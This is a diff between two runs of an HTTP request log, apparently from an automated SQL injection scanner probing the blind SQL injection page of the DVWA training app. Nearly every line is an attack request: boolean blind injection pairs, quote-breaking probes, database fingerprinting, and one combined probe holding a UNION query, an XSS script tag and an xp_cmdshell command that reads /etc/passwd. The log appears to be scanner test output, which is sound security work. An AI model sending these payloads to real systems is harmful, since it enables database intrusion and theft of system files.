@@ -2,88 +2,88 @@
 -e GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#2]:
--e GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit&HEqc=6738 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')# HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit&rTie=9095 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')# HTTP/1.1
 -e --
 -e HTTP request [#3]:
 -e GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#4]:
--e GET /vulnerabilities/sqli_blind/?id=4577&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=3932&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#5]:
--e GET /vulnerabilities/sqli_blind/?id=2700&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=3061&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#6]:
--e GET /vulnerabilities/sqli_blind/?id=1')",((.('"&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1.()').,,("&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#7]:
--e GET /vulnerabilities/sqli_blind/?id=1'KdHcGh<'">YFvrNz&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1'Witwli<'">ehAPhe&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#8]:
--e GET /vulnerabilities/sqli_blind/?id=1) AND 4217=4540 AND (2790=2790&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1) AND 5397=5276 AND (9041=9041&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#9]:
--e GET /vulnerabilities/sqli_blind/?id=1) AND 2983=2983 AND (8108=8108&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1) AND 6880=6880 AND (6261=6261&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#10]:
--e GET /vulnerabilities/sqli_blind/?id=1 AND 4920=4161&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1 AND 3320=5706&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#11]:
--e GET /vulnerabilities/sqli_blind/?id=1 AND 2983=2983&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1 AND 6880=6880&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#12]:
--e GET /vulnerabilities/sqli_blind/?id=1 AND 4473=2009-- FeZG&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1 AND 2322=3948-- KMlg&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#13]:
--e GET /vulnerabilities/sqli_blind/?id=1 AND 2983=2983-- bTbR&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1 AND 6880=6880-- fyOH&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#14]:
--e GET /vulnerabilities/sqli_blind/?id=1') AND 1243=3028 AND ('njIu'='njIu&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1') AND 8746=8789 AND ('IQdD'='IQdD&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#15]:
--e GET /vulnerabilities/sqli_blind/?id=1') AND 2983=2983 AND ('HPWp'='HPWp&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1') AND 6880=6880 AND ('THJR'='THJR&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#16]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND 3662=8858 AND 'TwXU'='TwXU&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND 1721=4192 AND 'atUu'='atUu&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#17]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND 2983=2983 AND 'FWka'='FWka&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND 6880=6880 AND 'ZuCQ'='ZuCQ&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#18]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND 9477=8906 AND 'GGLK'='GGLK&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND 2669=3348 AND 'YrAB'='YrAB&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#19]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND 60=60 AND 'EHKL'='EHKL&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND 34=34 AND 'CVki'='CVki&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#20]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND 60=93 AND 'SLfD'='SLfD&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND 34=100 AND 'ttZk'='ttZk&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#21]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND 93=90 AND 'omDX'='omDX&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND 100=73 AND 'FbbK'='FbbK&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#22]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND 90=90 AND 'MjDQ'='MjDQ&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND 73=73 AND 'Kzsq'='Kzsq&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#23]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND 93 90 AND 'APGx'='APGx&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND 100 73 AND 'DhUX'='DhUX&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#24]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND 8894= 8894 AND 'qhGc'='qhGc&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND 3197= 3197 AND 'STle'='STle&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#25]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND (9929)=9929 AND 'BAox'='BAox&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND (6126)=6126 AND 'hisg'='hisg&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#26]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND 9930>9929 AND 'VXhS'='VXhS&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND 6127>6126 AND 'WIBW'='WIBW&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#27]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND QUARTER(NULL) IS NULL AND 'KyXX'='KyXX&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND QUARTER(NULL) IS NULL AND 'XzTz'='XzTz&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#28]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND SESSION_USER() LIKE USER() AND 'HWeA'='HWeA&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND SESSION_USER() LIKE USER() AND 'Irmd'='Irmd&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#29]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND VERSION() LIKE 0x254d61726961444225 AND 'BdxN'='BdxN&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND VERSION() LIKE 0x254d61726961444225 AND 'HlvP'='HlvP&Submit=Submit HTTP/1.1
 -e --
 -e HTTP request [#30]:
--e GET /vulnerabilities/sqli_blind/?id=1' AND ISNULL(TIMESTAMPADD(MINUTE,9265,NULL)) AND 'qwAB'='qwAB&Submit=Submit HTTP/1.1
+-e GET /vulnerabilities/sqli_blind/?id=1' AND ISNULL(TIMESTAMPADD(MINUTE,2852,NULL)) AND 'nIsb'='nIsb&Submit=Submit HTTP/1.1
